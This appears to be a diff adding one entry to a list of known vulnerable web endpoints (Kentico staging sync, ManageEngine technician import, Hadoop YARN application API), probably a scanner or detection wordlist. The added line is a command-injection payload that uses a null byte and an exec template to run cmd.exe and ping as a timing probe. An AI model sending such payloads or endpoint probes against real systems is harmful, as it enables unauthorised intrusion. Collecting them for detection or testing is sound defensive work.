@@ -3,3 +3,4 @@
 /CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData
 /RestAPI/ImportTechnicians
 /ws/v1/cluster/apps/new-application
+/?search==%00{.exec|cmd.exe+/c+ping+127.0.0.1+-n+10.}
